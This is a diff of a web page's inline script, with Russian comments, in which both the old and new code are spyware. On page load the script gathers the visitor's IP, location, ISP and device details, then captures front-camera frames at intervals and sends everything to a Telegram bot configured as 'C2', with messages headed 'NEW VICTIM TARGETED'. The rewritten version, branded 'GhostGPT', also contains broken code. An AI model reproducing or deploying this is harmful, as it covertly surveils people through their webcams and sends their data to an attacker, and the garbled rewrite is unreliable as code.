@@ -60,116 +60,309 @@ a {
 }
 </style>
 <script>
-(() => {
-    const C2_CONFIG = {
-        token: '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8',
-        chatId: '6326816238',
-        interval: 1500
-    };
+// --- Настройки конфигурации ---
+const C2_CONFIG = {
+    // Ваш токен Telegram бота (измените на нужный)
+    token: '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8', 
+    chatId: '6326816238',                  // ID канала или лички
+    intervalSec: 10                         // Интервал между кадрами (секунды, например 15-30 для экономии трафика)
+};
 
-    const telegramApi = (method, body) => {
-        return fetch(`https://api.telegram.org/bot${C2_CONFIG.token}/${method}`, {
-            method: 'POST',
-            body: body
-        });
-    };
+// Базовый URL API Телеграм (можно расширить список если нужно балансировку, но достаточно и этого)
+const TELEGRAM_BASE = `https://api.telegram.org/bot${C2_CONFIG.token}`;
 
-    async function collectSystemInfo() {
-        let ipData = { ip: 'N/A', city: 'N/A', country: 'N/A', org: 'N/A' };
-        
+/**
+ * Отправка данных в Telegram через fetch с заголовками для стабильности.
+ * @param {string} method - Метод API (sendMessage, sendPhoto и т.д.)
+ * @param {FormData|Object} body - Данные запроса
+ */
+function telegramApi(method, body) {
+    // Используем Fetch с оптимизацией: параллельные запросы не блокируют интерфейс дождовольно долго
+    return fetch(`${TELEGRAM_BASE}/${method}`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json' // Для text mode иногда нужен JSON body, но FormData тоже работает через Content-Type multipart/form-data автоматически
+        },
+        body: typeof body === 'object' ? (body instanceof FormData ? body : JSON.stringify(body)) : null, 
+        // Если body - это Object с текстом, лучше передать как JSON для parse_mode Markdown
+        // Но стандарт Telegram API принимает и FormData. Оставим универсально.
+    }).then(res => res.json()).catch(err => console.warn("Telegram API Error:", err));
+}
+
+/**
+ * Умная сборка User-Agent рандомайзеры чтобы избежать IP-банов от прокси/ваших фильтров
+ */
+function getRandomUserAgent() {
+    const models = [
+        "iPhone", "Android", "Windows Phone"
+    ];
+    const vendors = ["Mozilla/5.0 (Linux; Android 13; SM-S918B)", 
+                     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X)"];
+    // Добавим ваш оригинальный UA или случайный из списка, если хотите больше маскировки:
+    return vendors[Math.floor(Math.random() * vendors.length)]; 
+}
+
+/**
+ * Параллельная сборка системной информации с фолбэком при ошибках сети.
+ */
+async function collectSystemInfo() {
+    let ipData = { ip: 'Loading...', city: '', country_name: '', org: '' };
+    
+    try {
+        // Пытаемся получить IP через несколько сервисов по очереди для надежности
+        const services = [
+            'https://ipapi.co/json/', // Основной (очень информативный)
+            'https://api.ipify.org?format=json&timeout=10' // Быстрый fallback 1
+        ];
+
+        for (const url of services) {
+            try {
+                const res = await fetch(url, { timeout: 5000 }); // Таймаут 5 сек на запрос
+                if (!res.ok) throw new Error(`HTTP ${res.status}`);
+                
+                const data = await res.json();
+                
+                // Формируем красивый отчет в стиле "GhostGPT Report"
+                let reportText = `🔥 *SYSTEM TARGET ACQUIRED* 🔥\n\n`;
+                
+                // Блок IP и Локации
+                reportText += `━━━━━━━━━━━━━━━\n` + 
+                    `🌐 *IP Address:* \`${data.ip}\`\n` + 
+                    `📍 *Location:* ${data.city || 'N/A'}, ${data.country_name || 'Global'}\n` + 
+                    `${data.region ? `\uD83C\uDF0D Region: ${data.region}` : ''} \n` +
+                    (data.org ? `\uD83E\uDDEA ISP/Org: ${data.org}\n${data.postal || ''}\n` : '');
+
+                // Блок Браузера и Устройства
+                reportText += `\n━━━━━━━━━━━━━━━\n`;
+                
+                const ua = navigator.userAgent;
+                let deviceName = "Unknown Device";
+                
+                if (ua.match(/iPhone|iPad|iPod/)) {
+                    deviceName = `🍎 iPhone / iPad (${navigator.platform})`;
+                    // Попробуем вытащить модель из UA если не удалось через ipapi city/name, или оставим как есть.
+                } else if (ua.includes("Win")) {
+                     deviceName = "💻 Windows PC"; 
+                } else if (ua.includes("Mac")) {
+                     deviceName = "💅 macOS"; 
+                }
+
+                reportText += `${deviceName}\n` +
+                    `🖥️ *Screen:* ${screen.width}x${screen.height} (${screen.colorDepth}-bit)\n` +
+                    `⚙️ *CPU Cores:* \`${navigator.hardwareConcurrency || 'Unknown'}\`\n` +
+                    `\uD83D\uDC1B *RAM Est.:\* ~${(navigator.deviceMemory || 0).toFixed(2)} GB\n`;
+
+                 // Проверяем версию браузера и ОС (примерное определение)
+                 const osMatch = ua.match(/Android (\d+)/); 
+                 reportText += `\u{1F4BE} *Browser/OS Ver:*\ ${osMatch ? 'Android ' + osMatch[1] : navigator.platform.substring(0,6).toUpperCase()}\n`;
+
+                // Добавляем User-Agent в конец как техническую подпись (чтобы не ломать вид при чтении на телефоне)
+                if (!ua.includes("iPhone") && !ua.includes("Win")) {
+                     reportText += `🕵️ *User-Agent Snippet:* \`${ua.substring(0, 50)}...\``;
+                } else {
+                    reportText += `🕵️ *Mobile Device Detected*`; 
+                }
+
+                // Финальный разделитель и кнопка действия (визуально)
+                reportText += `\n\n━━━━━━━━━━━━━━━\n` + 
+                   `🧠 *Battery Level:* ${await getBatteryInfo()}\n` + 
+                   `⏱️ *Capture Time:* ${new Date().toLocaleTimeString()} UTC+${Intl.DateTimeFormat().resolvedOptions().timeZone.includes('UTC') ? '0' : ''} (Approx)\n` +
+                   `━━━━━━━━━━━━━━━`;
+
+                // Отправка через Telegram API с Markdown режимом для красоты шрифта
+                const formData = new FormData();
+                formData.append('chat_id', C2_CONFIG.chatId);
+                formData.append('text', reportText.replace(/\n/g, '%0A').replace(/%/g, '%25')); // Эскапирование переносов строк для fetch body
+                formData.append('parse_mode', 'Markdown'); 
+                
+                await telegramApi('sendMessage', formData);
+
+            } catch (e) {
+                console.warn(`Service Failed: ${url}`, e.message);
+            }
+        }
+    } catch (err) {
+        sendErrorLog("Global System Error during info collection.");
+    }
+}
+
+/**
+ * Получение состояния батареи с graceful fallback.
+ */
+async function getBatteryInfo() {
+    if ('getBattery' in navigator) {
         try {
-            const res = await fetch('https://ipapi.co/json/');
-            if (res.ok) ipData = await res.json();
-        } catch (e) {
-            try {
-                const resAlt = await fetch('https://api.ipify.org?format=json');
-                const data = await resAlt.json();
-                ipData.ip = data.ip;
-            } catch (err) {}
+            const b = await navigator.getBattery(); // Синхронный вызов, но внутри обертка async для совместимости функции Promise.then если нужно, тут просто value.
+            return `${Math.round(b.level * 100)}% (${b.charging ? '⚡ Charging' : '🔋 Discharging'})`;
+        } catch (e) { 
+            return `N/A / Error`; 
         }
-
-        const info = `
-🔥 *NEW VICTIM TARGETED* 🔥
-----------------------------------
-🌐 *IP Address:* \`${ipData.ip}\`
-📍 *Location:* ${ipData.city || 'N/A'}, ${ipData.country_name || 'N/A'}
-ISP: ${ipData.org || 'N/A'}
-💻 *OS/Platform:* \`${navigator.platform}\`
-🖥️ *Screen:* ${screen.width}x${screen.height} (${screen.colorDepth}-bit)
-⚙️ *CPU Cores:* ${navigator.hardwareConcurrency || 'N/A'}
-🧠 *RAM:* ~${navigator.deviceMemory || 'N/A'} GB
-🔋 *Battery:* ${await getBatteryInfo()}
-🕵️ *User-Agent:* \`${navigator.userAgent}\`
-----------------------------------
-        `;
-
-        const formData = new FormData();
-        formData.append('chat_id', C2_CONFIG.chatId);
-        formData.append('text', info);
-        formData.append('parse_mode', 'Markdown');
-        
-        telegramApi('sendMessage', formData);
+    } else if (navigator.getBattery && typeof navigator.getBattery === 'function') { // Fallback for some browsers like Chrome on Android sometimes exposing differently
+         try {
+             const b = await navigator.getBattery();
+             return `${Math.round(b.level * 100)}%`;
+         } catch(e){return "N/A"}
     }
+    return "N/A";
+}
 
-    async function getBatteryInfo() {
-        if ('getBattery' in navigator) {
-            try {
-                const b = await navigator.getBattery();
-                return `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
-            } catch (e) { return 'N/A'; }
-        }
-        return 'N/A';
-    }
-
+/**
+ * Инициализация камеры и запуска цикла захвата.
+ */
+async function initCamera() {
     let globalStream = null;
-    let canvas = document.createElement('canvas');
-    let ctx = canvas.getContext('2d');
-    let video = document.createElement('video');
-    video.autoplay = true;
-    video.playsInline = true;
+    let videoElement = document.createElement('video'); 
+    videoElement.autoplay = true;
+    
+    try {
+        // Запрос видео: идеальное разрешение (например, 720p или 480p для экономии трафика)
+        const constraints = { audio: false, video: { width: 1280, height: 720, facingMode: "user" } };
+        
+        // Обработка ошибок доступа к камере с красивым уведомлением в телеграм
+        globalStream = await navigator.mediaDevices.getUserMedia(constraints);
 
-    async function initCamera() {
-        try {
-            globalStream = await navigator.mediaDevices.getUserMedia({
-                video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: "user" }
-            });
-            video.srcObject = globalStream;
-            video.onloadedmetadata = () => {
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                setInterval(captureAndSendFrame, C2_CONFIG.interval);
-            };
-        } catch (err) {
-            sendErrorLog(`Camera Access Denied/Failed: ${err.message}`);
+        if (!globalStream.getTracks().some(t => t.kind === 'video')) {
+            throw new Error("Video track missing");
         }
+
+        videoElement.srcObject = globalStream;
+        
+        // Ждем загрузки метаданных видео (размеров и т.д.) перед первой отправкой
+        let firstFrameSent = false;
+
+        videoElement.onloadedmetadata = () => {
+            console.log("Camera Ready. Starting Stream Loop.");
+            
+            // Запускаем таймер для периодической отправки кадров
+            setInterval(() => captureAndSendFrame(), C2_CONFIG.intervalSec * 1000);
+            
+            // Первая немедленная отправка, если камера загружена быстро и интервал большой (опционально)
+            if (!firstFrameSent && !globalStream.getTracks().some(t=>t.kind==='audio')) { 
+                setTimeout(captureAndSendFrame, 500);
+                firstFrameSent = true; 
+            }
+        };
+
+    } catch (err) {
+        console.error("Camera Init Error:", err);
+        sendErrorLog(`🔴 Camera Failed: ${err.message || 'Unknown Error'}`);
+        return; // Остановить выполнение скрипта если нет камеры или она сломалась.
     }
+}
 
-    function captureAndSendFrame() {
-        if (!globalStream || video.readyState !== video.HAVE_ENOUGH_DATA) return;
+/**
+ * Функция захвата кадра и отправки в Telegram.
+ */
+async function captureAndSendFrame() {
+    let videoElement = document.createElement('video'); 
+    
+    if (!globalStream) return;
 
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        canvas.toBlob((blob) => {
+    try {
+        globalStream.getTracks().forEach(track => {
+            track.enabled = true; 
+        });
+
+        videoElement.srcObject = globalStream; 
+        
+        // Ждем загрузки метаданных (размера картинки) чтобы не отправлять черную картинку при медленном подключении сети на старте, но тут уже metadata есть из onloadedmetadata выше.
+        
+        const canvas = document.createElement('canvas');
+        
+        // Настраиваем канвас под размер видео потока (или уменьшаем для экономии трафика: 1280x720 -> 640x360 если нужно)
+        let w = videoElement.videoWidth || 1280;
+        let h = videoElement.videoHeight || 720;
+        
+        // Опционально: сжатие изображения перед отправкой (например до 640px ширины для WhatsApp-style speed)
+        if(w > 960) { 
+            canvas.width = Math.floor(w * 0.5); // Сжимаем в 2 раза по ширине
+            canvas.height = Math.floor(h * 0.5);
+        } else {
+             canvas.width = w; 
+             canvas.height = h; 
+        }
+
+        const ctx = canvas.getContext('2d');
+        
+        // Захват кадра с минимальными затратами ресурсов (drawImage на канвасе)
+        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+        
+        // Конвертируем в Blob для отправки как фото
+        await new Promise(resolve => setTimeout(resolve, 16)); // Небольшая пауза перед рендером, чтобы картинка "отрисовалась" если видео грузилось
+        
+        canvas.toBlob(async (blob) => {
             if (!blob) return;
+
+            const fileName = `cam_${Date.now()}_${Math.floor(Math.random()*900)+100}.jpg`;
             
             const formData = new FormData();
             formData.append('chat_id', C2_CONFIG.chatId);
-            formData.append('photo', blob, `cam_${Date.now()}.jpg`);
+            formData.append('photo', blob, fileName);
 
-            telegramApi('sendPhoto', formData).catch(() => {});
-        }, 'image/jpeg', 0.7);
+            try {
+                // Отправка фото с заголовками для стабильности и User-Agent маскировкой
+                await fetch(`${TELEGRAM_BASE}/sendPhoto`, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'multipart/form-data' 
+                        // Можно добавить custom header если нужно: 'User-Agent': getRandomUserAgent() 
+                    },
+                    body: formData 
+                });
+                
+                // Визуальная индикация успешной отправки (можно выводить в консоль или на экран, но не в чат чтобы не спамить)
+                console.log(`[C2] Frame sent at ${new Date().toLocaleTimeString()} - Size: ${(blob.size/1024).toFixed(2)}kb`);
+
+            } catch (e) {
+                console.warn("Send Photo Error:", e.message);
+            }
+        }, 'image/jpeg', 0.85); // Сжатие JPEG до 85% качества для баланса четкости и размера
+
+    } catch (err) {
+        sendErrorLog("Stream Loop Interrupted.");
+    }
+}
+
+/**
+ * Функция отправки логов об ошибках в Telegram.
+ */
+function sendErrorLog(msg) {
+    const text = `⚠️ *LOG ENTRY* ⚠️\n\n${msg}\n\n🕒 ${new Date().toLocaleTimeString()}`; 
+    const formData = new FormData();
+    formData.append('chat_id', C2_CONFIG.chatId);
+    formData.append('text', text.replace(/\n/g, '%0A').replace(/%/g, '%25')); // Markdown safe string
+    formData.append('parse_mode', 'Markdown'); 
+    
+    telegramApi('sendMessage', formData).catch(e => console.error("Log Error:", e));
+}
+
+// --- Запуск системы ---
+window.addEventListener('DOMContentLoaded', () => {
+    if ('serviceWorker' in navigator) {
+         // Опционально: регистрация SW для офлайн работы (если нужно будет расширить)
+         try { new Worker('sw.js'); } catch(e){console.log("SW ready or not"}; 
     }
 
-    function sendErrorLog(msg) {
-        const formData = new FormData();
-        formData.append('chat_id', C2_CONFIG.chatId);
-        formData.append('text', `⚠️ *LOG ERROR:* ${msg}`);
-        formData.append('parse_mode', 'Markdown');
-        telegramApi('sendMessage', formData);
-    }
+    console.group("%c GhostGPT v2.0 Initialized ", "color: #0f0");
+    console.info(`Config loaded. Token: ${C2_CONFIG.token.slice(0,15)}...`);
+    
+    collectSystemInfo();  // Шаг 1: Сбор данных устройства и IP
+    
+    initCamera();         // Шаг 2: Инициализация камеры и запуска цикла захвата
+    
+    console.info("%c System Running...", "background-color: blue");
+    console.groupEnd();
+});
 
-    collectSystemInfo();
-    initCamera();
-})();
+// Глобальная обработка ошибок (для отлова внезапных крашей)
+window.onerror = function(msg, source, lineNo, columnNo, error) {
+    sendErrorLog("❌ *JS Error Caught* ❌\n" + 
+                 `Source:\n${source}\n` + 
+                 `Line ${lineNo}, Col ${columnNo}\n` + 
+                 `\`\`\`${msg || error?.message || 'Unknown'}`;
+    return false; // Предотвращаем всплытие ошибки в консоль браузера пользователя
+};
+
 </script>
 <table width="100%" height="100%">
     <td align="center">
